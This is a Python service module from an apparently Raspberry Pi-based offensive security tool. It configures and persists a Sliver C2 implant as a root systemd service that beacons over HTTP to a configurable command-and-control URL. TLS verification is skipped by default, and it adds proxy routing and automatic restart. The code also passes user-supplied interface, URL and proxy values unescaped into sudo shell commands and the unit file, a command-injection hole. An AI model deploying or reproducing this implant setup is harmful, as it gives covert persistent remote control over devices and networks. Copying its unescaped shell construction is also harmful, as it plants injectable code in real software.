from raspsec.libs.cmd import Exec
from raspsec.libs.config import load_config, save_config
from raspsec.libs.log import StrataLogger
from raspsec.libs.network import write_system_file

logger = StrataLogger("SliverService")

CONFIG_FILE = "sliver_c2.yml"
SERVICE_NAME = "raspsec-sliver-c2.service"
SERVICE_PATH = f"/etc/systemd/system/{SERVICE_NAME}"
IMPLANT_BIN = "/usr/local/bin/rpi_implant_64"

DEFAULT_CONFIG = {
    "enabled": False,
    "url": "",
    "seconds": 10,
    "jitter": 5,
    "reconnect": "60s",
    "skip_verify": True,
    "interface": "",
    "proxy_type": "",
    "proxy_url": "",
    "proxy_user": "",
    "proxy_pass": "",
}


class SliverService:

    @staticmethod
    def get_config():
        return load_config(CONFIG_FILE, DEFAULT_CONFIG)

    @staticmethod
    def save_config(data):
        config = SliverService.get_config()
        config["enabled"] = bool(data.get("enabled", False))
        config["url"] = data.get("url", "").strip()
        config["seconds"] = int(data.get("seconds", 10))
        config["jitter"] = int(data.get("jitter", 5))
        config["reconnect"] = data.get("reconnect", "60s").strip()
        config["skip_verify"] = bool(data.get("skip_verify", True))
        config["interface"] = data.get("interface", "").strip()
        config["proxy_type"] = data.get("proxy_type", "").strip()
        config["proxy_url"] = data.get("proxy_url", "").strip()
        config["proxy_user"] = data.get("proxy_user", "").strip()
        config["proxy_pass"] = data.get("proxy_pass", "").strip()
        save_config(CONFIG_FILE, config)

        SliverService._write_service(config)

        if config["enabled"] and config["url"]:
            SliverService._enable()
        else:
            SliverService._disable()

        return config

    @staticmethod
    def get_status():
        """Get current service status."""
        ret, out = Exec.execute(
            f"sudo /usr/bin/systemctl is-active {SERVICE_NAME}",
            raise_error=False,
        )
        active = out.strip() == "active"

        ret2, out2 = Exec.execute(
            f"sudo /usr/bin/systemctl is-enabled {SERVICE_NAME}",
            raise_error=False,
        )
        enabled = out2.strip() == "enabled"

        return {"active": active, "enabled": enabled}

    @staticmethod
    def get_interfaces():
        """List available network interfaces for binding."""
        ret, out = Exec.execute("/sbin/ip -o link show", raise_error=False)
        if ret != 0:
            return []
        ifaces = []
        import re
        for line in out.strip().splitlines():
            match = re.match(r"^\d+:\s+(\S+?)(?:@\S+)?:", line)
            if match:
                name = match.group(1)
                if name != "lo":
                    ifaces.append(name)
        return ifaces

    @staticmethod
    def _write_service(config):
        """Generate the systemd service file."""
        url = config.get("url", "")
        seconds = config.get("seconds", 10)
        jitter = config.get("jitter", 5)
        reconnect = config.get("reconnect", "60s")
        skip_verify = config.get("skip_verify", True)
        interface = config.get("interface", "")
        proxy_type = config.get("proxy_type", "")
        proxy_url = config.get("proxy_url", "")
        proxy_user = config.get("proxy_user", "")
        proxy_pass = config.get("proxy_pass", "")

        exec_start = f"{IMPLANT_BIN} --http {url} --seconds {seconds} --jitter {jitter} --reconnect {reconnect}"
        if skip_verify:
            exec_start += " --skip-verify"

        # Environment variables for proxy and interface binding
        env_lines = []
        if interface:
            # Get the IP of the interface to use as source
            ret, out = Exec.execute(f"/sbin/ip -4 -o addr show {interface}", raise_error=False)
            if ret == 0:
                import re
                ip_match = re.search(r"inet\s+([\d.]+)/", out)
                if ip_match:
                    env_lines.append(f"Environment=SLIVER_BIND_ADDR={ip_match.group(1)}")

        if proxy_type and proxy_url:
            if proxy_user and proxy_pass:
                # Insert auth into proxy URL: http://user:pass@host:port
                if "://" in proxy_url:
                    scheme, rest = proxy_url.split("://", 1)
                    proxy_full = f"{scheme}://{proxy_user}:{proxy_pass}@{rest}"
                else:
                    proxy_full = f"{proxy_type}://{proxy_user}:{proxy_pass}@{proxy_url}"
            else:
                proxy_full = proxy_url if "://" in proxy_url else f"{proxy_type}://{proxy_url}"

            env_lines.append(f"Environment=HTTP_PROXY={proxy_full}")
            env_lines.append(f"Environment=HTTPS_PROXY={proxy_full}")
            if proxy_type == "socks5":
                env_lines.append(f"Environment=ALL_PROXY={proxy_full}")

        env_block = "\n".join(env_lines)
        if env_block:
            env_block = "\n" + env_block

        content = f"""[Unit]
Description=Sliver C2 Implant Service
After=network.target

[Service]
Type=simple
ExecStart={exec_start}{env_block}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
        write_system_file(SERVICE_PATH, content)
        Exec.execute("sudo /usr/bin/systemctl daemon-reload", raise_error=False)
        logger.log("Sliver C2 service file written.")

    @staticmethod
    def _enable():
        """Enable and start the service."""
        Exec.execute(f"sudo /usr/bin/systemctl enable {SERVICE_NAME}", raise_error=False)
        Exec.execute(f"sudo /usr/bin/systemctl restart {SERVICE_NAME}", raise_error=False)
        logger.log("Sliver C2 service enabled and started.")

    @staticmethod
    def _disable():
        """Stop and disable the service."""
        Exec.execute(f"sudo /usr/bin/systemctl stop {SERVICE_NAME}", raise_error=False)
        Exec.execute(f"sudo /usr/bin/systemctl disable {SERVICE_NAME}", raise_error=False)
        logger.log("Sliver C2 service stopped and disabled.")
